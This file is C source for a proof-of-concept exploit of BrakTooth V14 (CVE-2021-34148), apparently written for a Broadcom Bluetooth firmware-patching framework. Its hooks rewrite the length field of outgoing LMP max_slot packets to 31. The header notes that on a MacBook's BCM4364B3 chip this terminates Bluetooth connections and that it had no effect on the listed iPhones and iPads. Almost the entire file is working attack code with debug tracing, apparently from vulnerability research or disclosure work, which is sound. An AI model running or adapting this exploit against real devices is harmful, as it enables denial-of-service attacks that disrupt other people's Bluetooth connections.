/*
PoC for BrakTooth V14: Max Slot Length Overflow
(CVE-2021-34148).

Current connection and other connections are terminated:

 * macOS 11.5.2, MBP 2020, BCM4364B3

Against this chip, it doesn't matter if we set the length=31
in the max_slot or in the auto_rate message.

No effect:

 * iOS 15B8, iPhone 12
 * iOS 14.2.1, iPhone 12
 * iOS 14.7.1, iPhone SE2020
 * iOS 13.3, iPhone 11
 * iOS 14.7, iPhone 8
 * iPadOS 14.1, iPad Air 2020

Just the effect that for 1-2 seconds when connecting the
sound might stock, but that's "normal" until hopping is
negotiated I think.

*/

#include <frankenstein/BCMBT/patching/patchram.h>
#include <frankenstein/BCMBT/patching/hciio.h>
#include <frankenstein/hook.h>


void bcs_dmaTxEnable();
void lm_SendLmpMaxSlot();
void lm_SendLmpAutoRate();
void bcs_utilBbRxPktHdr();
void bcs_utilBbRxPyldHdr();
void DHM_BasebandRx();
void lm_LmpReceived();
void DHM_LMPTx();
void bcs_utilBbRxPyldCheck();


extern int tx_pkt_info;
extern int tx_pkt_pyld_hdr;

void lm_SendLmpMaxSlot_prehook(struct saved_regs *regs, void *arg);
void bcs_utilBbRxPktSetLength_prehook(struct saved_regs *regs, void *arg);
void bcs_utilBbRxPyldCheckprehook(struct saved_regs *regs, void *arg);
void bcs_utilBbRxPyldHdr_posthook(struct saved_regs *regs, void *arg);
void DHM_BasebandRx_prehook(struct saved_regs *regs, void *arg);
void lm_LmpReceived_prehook(struct saved_regs *regs, void *arg);
void DHM_LMPTx_prehook(struct saved_regs *regs, void *arg);


int dhm1_count = 0;
int dh31_count = 0;
int switch_to_dh31 = 0;

int counter = 0;
void bcs_dmaTxEnable_set_len(struct saved_regs *regs, void *arg) {
    //int len = (*(int *)(regs->r0 + 0x0a)>>3) & 0x3ff;
    char *data = (char *)(*(int *)(regs->r0 + 0x10) & 0xfffffffc);


    //if (switch_to_dh31) {
    //    tx_pkt_info = (tx_pkt_info & 0b1111111110000111) | (8 << 3);  // LT_ADDR = 0b000, Type = 0xa, Flow = 0b1, keep following 8 bit intact
    //}

    if (data[0] >> 1 != 0x2d) return; //max_slots
    //if (data[0] >> 1 != 0x23) return; //auto_rate
    //if (data[0] >> 1 != 0x33) return; //connection won't start
    //if (data[0] >> 1 != 0x3c) return; //connection won't start
    int* payload_header = (int *)(regs->r0 + 0x0a);  // e.g. 0x010017
    //*payload_header |= 0b11111000; // keep everything intact except from the length (=31)
    //*payload_header |= 0b1010101000; // 3-DH1 up to 85 bytes

    int len = 31;
    tx_pkt_pyld_hdr = (tx_pkt_pyld_hdr & 0b11111111111111111111111100000111) | (len << 3);

    // set the Type field to 8, since 3+8 are accepted as LMP
    //tx_pkt_info = (tx_pkt_info & 0b1111111110000111) | (8 << 3);  // LT_ADDR = 0b000, Type = 0xa, Flow = 0b1, keep following 8 bit intact
    //switch_to_dh31 = 1;



    // first 3 bits are LLID (=11) and Flow (=1), only set the length
    // length=2 reduces transmitted payload to 2 bytes
    // everything >17 seems to stop packet transmission
    //int set_len = 31;  // TODO adjust LMP length here
    //tx_pkt_pyld_hdr = (set_len << 3) | 0b111;
    //data[1] = 0x01; // set a different slot number
    //01, 03 and 05 didn't change anything when testing the iPhone 11
    counter ++;
}



// the payload header routine accesses the packet header
void bcs_utilBbRxPyldHdr_posthook(struct saved_regs *regs, void *arg) {

    char *packet_header =  (char *)((int *)(regs->r0));

    int lt_addr = packet_header[0] & 0b111;
    int type = (packet_header[0] >> 3) & 0xf;
    // not a NULL (0) or POLL (1) packet -> print info
    // type 3: DM1 ACL

    // too many prints, just keep track of total number
    if (type == 3) {
        dhm1_count++;

        if (dhm1_count % 30 == 0) {
            print("+30 DM1 packets\n");
        }
    } else if (type == 8) {
        dh31_count++;
        if (dh31_count % 500 == 0) {
            print("+500 DH3-1 packets\n");
        }
    }

    /*
    if (type>1) {
        print_var(lt_addr);
        print_var(type);
    } else {
        print(type);
    }
    */




}

// when we set the length we also have read the payload header
void bcs_utilBbRxPktSetLength_preehok(struct saved_regs *regs, void *arg) {

    print("set_length_prehook\n");

    //int len = (*(int *)(regs->r0 + 4)>>3) & 0x3ff;
    //print_var(len)

    //print_var(l); // length doesn't make sense, neither pre nor post hook...

    /*
    char *packet_header =  (char *)((int *)(regs->r0));
    int type = (packet_header[0] >> 3) & 0xf;
    char *payload_header =  (char *)((int *)(regs->r0+1));


    //int len = (payload_header[1]<<8 & payload_header[0]) & 0xe007;

    if (type == 3) {
        //print_var(len);
        //print_var(payload_header[2]>>3);

        print_var(dhm1_count);
        dhm1_count= 0; //reset counter for packet type 3 (DHM1)
    }
    */

    // test if this would cause overflows
    //payload_header[0] = (31 << 3) | 0b111;
    //print("rx len overwritten and set to 31\n");

}

int packet_header_old = 0;
void DHM_BasebandRx_prehook(struct saved_regs *regs, void *arg) {

    //int packet_header = (*(int *)(regs->r0));
    char *packet_header =  (char *)((int *)(regs->r1+4));
    char *payload =  (char *)((int *)(regs->r2+4));  // as accessed by LMP
    //if (packet_header[0] == packet_header_old) return;
    //packet_header_old = packet_header[0];

    //var hec = (packet_header & 0xff00)>>8
    //packet_header &= 0xff;  // we have an 1b header in this case

    //print_var((opcode & 0xff)>>1);
    print_var(packet_header[0]);
    print_var(payload[0]);
}

// Print received LMP opcodes
// -> make sure target is not dead
void lm_LmpReceived_prehook(struct saved_regs *regs, void *arg) {
    char *payload =  (char *)((int *)(regs->r1+4));
    print_var(payload[0]>>1);
}

void DHM_LMPTx_prehook(struct saved_regs *regs, void *arg) {
    char *lmp_sent =  (char *)((int *)(regs->r1+12));
    print_var(lmp_sent[0]>>1);
}



int _start() {
    print("Hello\n");
     //*(int*)0x318038 = rand(); // randomize MAC
    add_hook(bcs_dmaTxEnable, bcs_dmaTxEnable_set_len, NULL, NULL);
    //trace(lm_SendLmpMaxSlot, 1);
    add_hook(lm_SendLmpMaxSlot, lm_SendLmpMaxSlot_prehook, NULL, NULL);
    add_hook(bcs_utilBbRxPktSetLength, bcs_utilBbRxPktSetLength_preehok, NULL, NULL);
    add_hook(bcs_utilBbRxPyldHdr, bcs_utilBbRxPyldHdr_posthook, NULL, NULL);
    //add_hook(DHM_BasebandRx, DHM_BasebandRx_prehook, NULL, NULL);
    add_hook(lm_LmpReceived, lm_LmpReceived_prehook, NULL, NULL);
    add_hook(DHM_LMPTx, DHM_LMPTx_prehook, NULL, NULL);

    trace(lm_SendLmpAutoRate, 1);
}

// just to have this info printed as hook confirmation
// needs to be here because BCS is time sensitive
void lm_SendLmpMaxSlot_prehook(struct saved_regs *regs, void *arg) {
    print("lm_SendLmpMaxSlot, going to set length...\n");
}

void _fini() {
    print("Goodbye cruel world\n");
    print_ptr(counter);
    print("\n");
    for (int i=0; i < installed_hooks; i++) {
        uninstall_hook(&hooks[i]);
    }
}
